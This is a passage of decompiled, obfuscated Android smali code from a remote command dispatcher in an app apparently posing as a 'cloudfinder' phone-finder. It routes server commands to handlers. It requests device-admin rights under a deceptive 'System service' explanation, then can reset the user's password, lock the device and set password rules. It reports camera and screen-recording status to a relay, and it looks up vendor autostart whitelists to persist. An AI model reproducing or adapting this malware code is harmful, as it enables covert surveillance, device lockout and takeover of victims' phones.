    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ځ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_4a
    const-string v2, "mode"

    goto :goto_7

    :pswitch_4b
    const-string v2, "disconn"

    goto :goto_7

    :pswitch_4c
    const-string v2, "hide"

    :goto_7
    const/4 v4, 0x0

    invoke-virtual {v3, v2, v4}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    goto/16 :goto_e

    :pswitch_4d
    const/4 v4, 0x0

    const-string v2, "debug"

    invoke-virtual {v3, v2, v4}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    const-string v2, "debug msg set"

    invoke-static {v13, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_e

    :pswitch_4e
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->و(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_4f
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->م(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_50
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ر()V

    goto/16 :goto_e

    :pswitch_51
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ن(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_52
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ٿ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_53
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ڝ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_54
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ج(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_55
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ڀ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_56
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ؼ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_57
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ش(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_58
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ڟ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_59
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ٳ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_5a
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ٱ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_5b
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ٲ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_5c
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ٴ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_5d
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ٵ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_5e
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ة()V

    goto/16 :goto_e

    :pswitch_5f
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ڞ()V

    goto/16 :goto_e

    :pswitch_60
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ل()V

    goto/16 :goto_e

    :pswitch_61
    const/16 v2, 0x19

    invoke-virtual {v1, v2}, Lڜٟٱڀ/أ;->ڢ(I)V

    goto/16 :goto_e

    :pswitch_62
    const/16 v2, 0x18

    invoke-virtual {v1, v2}, Lڜٟٱڀ/أ;->ڢ(I)V

    goto/16 :goto_e

    :pswitch_63
    const/16 v2, 0x8

    invoke-static {v2}, Lڜٟٱڀ/أ;->ڣ(I)V

    goto/16 :goto_e

    :pswitch_64
    invoke-static/range {v18 .. v18}, Lڜٟٱڀ/أ;->ڣ(I)V

    goto/16 :goto_e

    :pswitch_65
    invoke-static/range {v17 .. v17}, Lڜٟٱڀ/أ;->ڣ(I)V

    goto/16 :goto_e

    :pswitch_66
    const/4 v2, 0x1

    invoke-static {v2}, Lڜٟٱڀ/أ;->ڣ(I)V

    goto/16 :goto_e

    :pswitch_67
    invoke-static/range {v16 .. v16}, Lڜٟٱڀ/أ;->ڣ(I)V

    goto/16 :goto_e

    :pswitch_68
    invoke-static {}, Lڜٟٱڀ/أ;->ٽ()V

    goto/16 :goto_e

    :pswitch_69
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ض()V

    goto/16 :goto_e

    :pswitch_6a
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ى(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_6b
    invoke-static/range {p2 .. p2}, Lڜٟٱڀ/أ;->ط(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_6c
    invoke-static/range {p2 .. p2}, Lڜٟٱڀ/أ;->ص(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_6d
    invoke-static/range {p2 .. p2}, Lڜٟٱڀ/أ;->ؽ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_6e
    invoke-static/range {p2 .. p2}, Lڜٟٱڀ/أ;->خ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_6f
    invoke-static/range {p2 .. p2}, Lڜٟٱڀ/أ;->ح(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_70
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ژ()V

    goto/16 :goto_e

    :pswitch_71
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ڕ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_72
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ڔ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_73
    invoke-static/range {p2 .. p2}, Lڜٟٱڀ/أ;->د(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_74
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ڍ()V

    goto/16 :goto_e

    :pswitch_75
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ڈ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_76
    invoke-static {}, Lڜٟٱڀ/أ;->ږ()V

    goto/16 :goto_e

    :pswitch_77
    invoke-static {}, Lڜٟٱڀ/أ;->ڗ()V

    goto/16 :goto_e

    :pswitch_78
    invoke-static {}, Lڜٟٱڀ/أ;->ڜ()V

    goto/16 :goto_e

    :pswitch_79
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ـ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :goto_8
    :pswitch_7a
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ف()V

    goto/16 :goto_e

    :goto_9
    :pswitch_7b
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ك()V

    goto/16 :goto_e

    :goto_a
    :pswitch_7c
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ق()V

    goto :goto_e

    :catch_1
    move-exception v0

    move-object v2, v0

    goto :goto_b

    :pswitch_7d
    invoke-static {}, Lڜٟٱڀ/أ;->ڏ()V

    goto :goto_e

    :pswitch_7e
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ڊ()V

    goto :goto_e

    :pswitch_7f
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ڎ()V

    goto :goto_e

    :pswitch_80
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ډ(Lorg/json/JSONObject;)V

    goto :goto_e

    :pswitch_81
    invoke-static/range {p2 .. p2}, Lڜٟٱڀ/أ;->څ(Lorg/json/JSONObject;)V

    goto :goto_e

    :pswitch_82
    invoke-static {}, Lڜٟٱڀ/أ;->ڐ()V

    goto :goto_e

    :pswitch_83
    invoke-static/range {p2 .. p2}, Lڜٟٱڀ/أ;->ڋ(Lorg/json/JSONObject;)V

    goto :goto_e

    :pswitch_84
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->پ(Lorg/json/JSONObject;)V

    goto :goto_e

    :pswitch_85
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ث()V

    goto :goto_e

    :pswitch_86
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ړ()V

    goto :goto_e

    :pswitch_87
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ت()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1

    goto :goto_e

    :goto_b
    move-object v3, v2

    move-object/from16 v2, p1

    goto :goto_d

    :goto_c
    move-object/from16 v2, p1

    move-object/from16 v3, v19

    :try_start_7
    invoke-virtual {v3, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v13, v3}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_2

    goto :goto_e

    :catch_2
    move-exception v0

    move-object v3, v0

    :goto_d
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "dispatch error for "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v13, v2, v3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :catch_3
    :cond_9
    :goto_e
    :pswitch_88
    return-void

    nop

    :sswitch_data_0
    .sparse-switch
        -0x7ff5350c -> :sswitch_a2
        -0x7ede5543 -> :sswitch_a1
        -0x776cf58b -> :sswitch_a0
        -0x742ed76d -> :sswitch_9f
        -0x7114c322 -> :sswitch_9e
        -0x70511793 -> :sswitch_9d
        -0x6f726cab -> :sswitch_9c
        -0x6ec49ff9 -> :sswitch_9b
        -0x6ec49f41 -> :sswitch_9a
        -0x6cee2bc9 -> :sswitch_99
        -0x6a014635 -> :sswitch_98
        -0x69cf8a6e -> :sswitch_97
        -0x69c6fe8f -> :sswitch_96
        -0x6942de91 -> :sswitch_95
        -0x68c6c762 -> :sswitch_94
        -0x66fe422f -> :sswitch_93
        -0x66e3a2ae -> :sswitch_92
        -0x66acef3d -> :sswitch_91
        -0x66a961a7 -> :sswitch_90
        -0x655c8994 -> :sswitch_8f
        -0x631d9eb5 -> :sswitch_8e
        -0x62ec1b51 -> :sswitch_8d
        -0x62ebfd49 -> :sswitch_8c
        -0x62979649 -> :sswitch_8b
        -0x62519b29 -> :sswitch_8a
        -0x60c50982 -> :sswitch_89
        -0x607eeb87 -> :sswitch_88
        -0x5fe6e78d -> :sswitch_87
        -0x5f52a8d5 -> :sswitch_86
        -0x5de01aa9 -> :sswitch_85
        -0x5c919d24 -> :sswitch_84
        -0x572dd9df -> :sswitch_83
        -0x55aa33e7 -> :sswitch_82
        -0x54c5f5cd -> :sswitch_81
        -0x54c5eca8 -> :sswitch_80
        -0x548ab2a9 -> :sswitch_7f
        -0x5443fb34 -> :sswitch_7e
        -0x53349440 -> :sswitch_7d
        -0x52a58fdd -> :sswitch_7c
        -0x51bbf26b -> :sswitch_7b
        -0x50ed1446 -> :sswitch_7a
        -0x50e6998d -> :sswitch_79
        -0x4fb6db02 -> :sswitch_78
        -0x4f1e9e0b -> :sswitch_77
        -0x4ea117d7 -> :sswitch_76
        -0x4dc17f2f -> :sswitch_75
        -0x4dba9e25 -> :sswitch_74
        -0x4c9585e5 -> :sswitch_73
        -0x4bdf6a26 -> :sswitch_72
        -0x4b4af53b -> :sswitch_71
        -0x4b4a90be -> :sswitch_70
        -0x4a70d2f1 -> :sswitch_6f
        -0x49c635ad -> :sswitch_6e
        -0x4634a97e -> :sswitch_6d
        -0x462a2ac6 -> :sswitch_6c
        -0x45a28b9b -> :sswitch_6b
        -0x43fab30b -> :sswitch_6a
        -0x43a3ea82 -> :sswitch_69
        -0x43a3e9c6 -> :sswitch_68
        -0x438ce02d -> :sswitch_67
        -0x41bc9202 -> :sswitch_66
        -0x416a209b -> :sswitch_65
        -0x37c82001 -> :sswitch_64
        -0x37b9b9a5 -> :sswitch_63
        -0x35fda7f3 -> :sswitch_62
        -0x352be782 -> :sswitch_61
        -0x321820bc -> :sswitch_60
        -0x30d96650 -> :sswitch_5f
        -0x2f8728de -> :sswitch_5e
        -0x2f6638c1 -> :sswitch_5d
        -0x2f242b18 -> :sswitch_5c
        -0x2bff8349 -> :sswitch_5b
        -0x25a6b802 -> :sswitch_5a
        -0x214d5fdd -> :sswitch_59
        -0x20b81b9c -> :sswitch_58
        -0x1f12fa9f -> :sswitch_57
        -0x1eda3a31 -> :sswitch_56
        -0x1a2ad993 -> :sswitch_55
        -0x18ea3298 -> :sswitch_54
        -0x18d27a9a -> :sswitch_53
        -0x129d423f -> :sswitch_52
        -0xf631287 -> :sswitch_51
        -0xf1dc742 -> :sswitch_50
        -0xc8a0b53 -> :sswitch_4f
        -0x8fa4d65 -> :sswitch_4e
        -0x83f8d69 -> :sswitch_4d
        -0x776d213 -> :sswitch_4c
        -0x12c14c -> :sswitch_4b
        0xe9b -> :sswitch_4a
        0x178aa -> :sswitch_49
        0x1851a -> :sswitch_48
        0x2e04e7 -> :sswitch_47
        0x2f24a2 -> :sswitch_46
        0x30f4df -> :sswitch_45
        0x333bd1 -> :sswitch_44
        0xf63634 -> :sswitch_43
        0x122b0ef -> :sswitch_42
        0x362e986 -> :sswitch_41
        0x3cafbf1 -> :sswitch_40
        0x3cb8965 -> :sswitch_3f
        0x3ef0fac -> :sswitch_3e
        0x3fad04c -> :sswitch_3d
        0x5978fff -> :sswitch_3c
        0x5b4b099 -> :sswitch_3b
        0x6233516 -> :sswitch_3a
        0x624eea3 -> :sswitch_39
        0x65e8905 -> :sswitch_38
        0x83f52e2 -> :sswitch_37
        0x9402bc6 -> :sswitch_36
        0xb8e6a2e -> :sswitch_35
        0xcd3b887 -> :sswitch_34
        0xd22e0d0 -> :sswitch_33
        0xf804ded -> :sswitch_32
        0xfc477d3 -> :sswitch_31
        0x12652dbd -> :sswitch_30
        0x145b0f07 -> :sswitch_2f
        0x15a7c081 -> :sswitch_2e
        0x15abd7b0 -> :sswitch_2d
        0x1e587b1d -> :sswitch_2c
        0x20b30143 -> :sswitch_2b
        0x20efc746 -> :sswitch_2a
        0x2182ae97 -> :sswitch_29
        0x218cfd68 -> :sswitch_28
        0x28e61e41 -> :sswitch_27
        0x2c62a1f2 -> :sswitch_26
        0x2db2e72c -> :sswitch_25
        0x2f4c826e -> :sswitch_24
        0x3139a5cf -> :sswitch_23
        0x3441a577 -> :sswitch_22
        0x35ab3281 -> :sswitch_21
        0x385c1dd4 -> :sswitch_20
        0x38f32dce -> :sswitch_1f
        0x4122cfd5 -> :sswitch_1e
        0x418cfbcf -> :sswitch_1d
        0x4392f453 -> :sswitch_1c
        0x46b7aa84 -> :sswitch_1b
        0x4e7c4a5a -> :sswitch_1a
        0x4e7c500d -> :sswitch_19
        0x4fed1454 -> :sswitch_18
        0x50aeb677 -> :sswitch_17
        0x55b91d41 -> :sswitch_16
        0x5723995d -> :sswitch_15
        0x57d2f721 -> :sswitch_14
        0x57dab0f0 -> :sswitch_13
        0x5b171d27 -> :sswitch_12
        0x5bae652e -> :sswitch_11
        0x5ccf90dd -> :sswitch_10
        0x5cde4e03 -> :sswitch_f
        0x5d52ebab -> :sswitch_e
        0x60ebfe70 -> :sswitch_d
        0x616d1af7 -> :sswitch_c
        0x65bda672 -> :sswitch_b
        0x663edb00 -> :sswitch_a
        0x67175214 -> :sswitch_9
        0x6ca26381 -> :sswitch_8
        0x6e22d591 -> :sswitch_7
        0x6ed9e27b -> :sswitch_6
        0x70e32196 -> :sswitch_5
        0x73a0b4ec -> :sswitch_4
        0x745d11b7 -> :sswitch_3
        0x75454c19 -> :sswitch_2
        0x76504eb0 -> :sswitch_1
        0x7f73c1ca -> :sswitch_0
    .end sparse-switch

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_87
        :pswitch_86
        :pswitch_86
        :pswitch_85
        :pswitch_84
        :pswitch_83
        :pswitch_82
        :pswitch_81
        :pswitch_80
        :pswitch_7f
        :pswitch_7e
        :pswitch_7d
        :pswitch_7c
        :pswitch_7b
        :pswitch_7a
        :pswitch_79
        :pswitch_78
        :pswitch_77
        :pswitch_76
        :pswitch_75
        :pswitch_75
        :pswitch_74
        :pswitch_73
        :pswitch_72
        :pswitch_72
        :pswitch_71
        :pswitch_71
        :pswitch_70
        :pswitch_70
        :pswitch_6f
        :pswitch_6e
        :pswitch_6d
        :pswitch_6c
        :pswitch_6b
        :pswitch_6a
        :pswitch_69
        :pswitch_68
        :pswitch_67
        :pswitch_66
        :pswitch_65
        :pswitch_64
        :pswitch_63
        :pswitch_62
        :pswitch_61
        :pswitch_60
        :pswitch_7c
        :pswitch_7c
        :pswitch_78
        :pswitch_78
        :pswitch_5f
        :pswitch_5f
        :pswitch_5e
        :pswitch_5e
        :pswitch_5d
        :pswitch_5c
        :pswitch_5b
        :pswitch_5a
        :pswitch_59
        :pswitch_58
        :pswitch_57
        :pswitch_56
        :pswitch_55
        :pswitch_54
        :pswitch_53
        :pswitch_52
        :pswitch_51
        :pswitch_50
        :pswitch_4f
        :pswitch_4e
        :pswitch_4d
        :pswitch_88
        :pswitch_88
        :pswitch_4c
        :pswitch_4b
        :pswitch_4a
        :pswitch_49
        :pswitch_48
        :pswitch_47
        :pswitch_46
        :pswitch_46
        :pswitch_45
        :pswitch_44
        :pswitch_43
        :pswitch_43
        :pswitch_42
        :pswitch_41
        :pswitch_40
        :pswitch_3f
        :pswitch_3e
        :pswitch_3d
        :pswitch_3c
        :pswitch_3c
        :pswitch_3c
        :pswitch_3c
        :pswitch_3c
        :pswitch_3b
        :pswitch_3b
        :pswitch_3a
        :pswitch_39
        :pswitch_38
        :pswitch_37
        :pswitch_36
        :pswitch_36
        :pswitch_35
        :pswitch_34
        :pswitch_33
        :pswitch_32
        :pswitch_31
        :pswitch_30
        :pswitch_30
        :pswitch_2f
        :pswitch_2e
        :pswitch_2d
        :pswitch_2c
        :pswitch_2b
        :pswitch_2a
        :pswitch_88
        :pswitch_29
        :pswitch_28
        :pswitch_27
        :pswitch_26
        :pswitch_25
        :pswitch_24
        :pswitch_23
        :pswitch_22
        :pswitch_21
        :pswitch_20
        :pswitch_1f
        :pswitch_1e
        :pswitch_1d
        :pswitch_1c
        :pswitch_1b
        :pswitch_1a
        :pswitch_19
        :pswitch_18
        :pswitch_17
        :pswitch_16
        :pswitch_15
        :pswitch_14
        :pswitch_13
        :pswitch_88
        :pswitch_12
        :pswitch_11
        :pswitch_10
        :pswitch_f
        :pswitch_e
        :pswitch_d
        :pswitch_c
        :pswitch_b
        :pswitch_a
        :pswitch_a
        :pswitch_9
        :pswitch_8
        :pswitch_78
        :pswitch_78
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method

.method public final آ(Ljava/lang/String;Lorg/json/JSONObject;)V
    .locals 10

    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    :try_start_0
    const-string v1, "device_policy"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/admin/DevicePolicyManager;

    new-instance v2, Landroid/content/ComponentName;

    const-class v3, Lcom/lite/cloudfinder/rda;

    invoke-direct {v2, v0, v3}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/4 v3, 0x1

    const/4 v4, 0x0

    if-eqz v1, :cond_0

    invoke-virtual {v1, v2}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v5

    if-eqz v5, :cond_0

    move v5, v3

    goto :goto_0

    :cond_0
    move v5, v4

    :goto_0
    invoke-virtual {p1}, Ljava/lang/String;->hashCode()I

    move-result v6

    const/4 v7, 0x4

    const/4 v8, 0x3

    const/4 v9, 0x2

    sparse-switch v6, :sswitch_data_0

    goto :goto_1

    :sswitch_0
    const-string v6, "admLockRule"

    invoke-virtual {p1, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_1

    move v6, v7

    goto :goto_2

    :sswitch_1
    const-string v6, "adm"

    invoke-virtual {p1, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_1

    move v6, v4

    goto :goto_2

    :sswitch_2
    const-string v6, "admLock"

    invoke-virtual {p1, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_1

    move v6, v8

    goto :goto_2

    :sswitch_3
    const-string v6, "admSet"

    invoke-virtual {p1, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_1

    move v6, v3

    goto :goto_2

    :sswitch_4
    const-string v6, "admPwd"

    invoke-virtual {p1, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_1

    move v6, v9

    goto :goto_2

    :cond_1
    :goto_1
    const/4 v6, -0x1

    :goto_2
    if-eqz v6, :cond_5

    if-eq v6, v3, :cond_5

    if-eq v6, v9, :cond_4

    if-eq v6, v8, :cond_3

    if-eq v6, v7, :cond_2

    goto :goto_3

    :cond_2
    if-eqz v5, :cond_6

    const-string v0, "quality"

    invoke-virtual {p2, v0, v4}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v0

    invoke-virtual {v1, v2, v0}, Landroid/app/admin/DevicePolicyManager;->setPasswordQuality(Landroid/content/ComponentName;I)V

    const-string v0, "minLength"

    invoke-virtual {p2, v0, v4}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result p2

    if-lez p2, :cond_6

    invoke-virtual {v1, v2, p2}, Landroid/app/admin/DevicePolicyManager;->setPasswordMinimumLength(Landroid/content/ComponentName;I)V

    goto :goto_3

    :cond_3
    if-eqz v5, :cond_6

    invoke-virtual {v1}, Landroid/app/admin/DevicePolicyManager;->lockNow()V

    goto :goto_3

    :cond_4
    if-eqz v5, :cond_6

    const-string v0, "pwd"

    const-string v2, ""

    invoke-virtual {p2, v0, v2}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p2}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_6

    invoke-virtual {v1, p2, v3}, Landroid/app/admin/DevicePolicyManager;->resetPassword(Ljava/lang/String;I)Z

    goto :goto_3

    :cond_5
    if-nez v5, :cond_6

    new-instance p2, Landroid/content/Intent;

    const-string v1, "android.app.action.ADD_DEVICE_ADMIN"

    invoke-direct {p2, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v1, "android.app.extra.DEVICE_ADMIN"

    invoke-virtual {p2, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    const-string v1, "android.app.extra.ADD_EXPLANATION"

    const-string v2, "System service requires administrator privileges"

    invoke-virtual {p2, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v1, 0x10000000

    invoke-virtual {p2, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, p2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_3

    :catch_0
    move-exception p2

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "handleAdm error: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v0, "CommandDispatcher"

    invoke-static {v0, p1, p2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_6
    :goto_3
    return-void

    nop

    :sswitch_data_0
    .sparse-switch
        -0x54c5f5cd -> :sswitch_4
        -0x54c5eca8 -> :sswitch_3
        -0x43fab30b -> :sswitch_2
        0x178aa -> :sswitch_1
        0x6e22d591 -> :sswitch_0
    .end sparse-switch
.end method

.method public final أ()V
    .locals 3

    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const-string v1, "deviceId"

    iget-object v2, p0, Lڜٟٱڀ/أ;->ؠ:Lڜٟٱڀ/د;

    iget-object v2, v2, Lڜٟٱڀ/د;->إ:Ljava/lang/String;

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "screen"

    sget v2, Lcom/lite/cloudfinder/service/ScreenRecordService;->؋:I

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v1, "camera"

    sget-boolean v2, Lcom/lite/cloudfinder/service/CameraService;->ة:Z

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    iget-object v1, p0, Lڜٟٱڀ/أ;->ؠ:Lڜٟٱڀ/د;

    iget-object v1, v1, Lڜٟٱڀ/د;->آ:Lةؽڗںۍټ٘/ء;

    if-eqz v1, :cond_0

    const-string v2, "relayStatus"

    invoke-virtual {v1, v2, v0}, Lةؽڗںۍټ٘/ء;->آ(Ljava/lang/String;Lorg/json/JSONObject;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    const-string v1, "CommandDispatcher"

    const-string v2, "ask_relay error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_0
    :goto_0
    return-void
.end method

.method public final ؤ()V
    .locals 12

    const-string v0, "com.asus.mobilemanager"

    const-string v1, "com.iqoo.secure"

    const-string v2, "com.oplus.battery"

    const-string v3, "com.coloros.safecenter"

    sget-object v4, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    if-nez v4, :cond_0

    const-string v4, ""

    goto :goto_0

    :cond_0
    invoke-virtual {v4}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    :goto_0
    :try_start_0
    const-string v5, "xiaomi"

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    iget-object v6, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const/4 v7, 0x2

    const/4 v8, 0x1

    const/4 v9, 0x0

    if-nez v5, :cond_10

    :try_start_1
    const-string v5, "redmi"

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-nez v5, :cond_10

    const-string v5, "poco"

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_1

    goto/16 :goto_4

    :cond_1
    const-string v5, "oppo"

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    const/4 v10, 0x3

    if-nez v5, :cond_f

    const-string v5, "realme"

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-nez v5, :cond_f

    const-string v5, "oneplus"

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_2

    goto/16 :goto_3

    :cond_2
    const-string v2, "vivo"

    invoke-virtual {v4, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_3

    new-array v0, v10, [[Ljava/lang/String;

    new-array v2, v7, [Ljava/lang/String;

    const-string v3, "com.vivo.permissionmanager"

    aput-object v3, v2, v9

    const-string v3, "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"

    aput-object v3, v2, v8

    aput-object v2, v0, v9

    new-array v2, v7, [Ljava/lang/String;

    aput-object v1, v2, v9

    const-string v3, "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager"

    aput-object v3, v2, v8

    aput-object v2, v0, v8

    new-array v2, v7, [Ljava/lang/String;

    aput-object v1, v2, v9

    const-string v1, "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity"

    aput-object v1, v2, v8

    aput-object v2, v0, v7

    invoke-static {v6, v0}, Lڗًقڔ/؋;->ډ(Landroid/content/Context;[[Ljava/lang/String;)Z

    goto/16 :goto_5

    :cond_3
    const-string v1, "samsung"

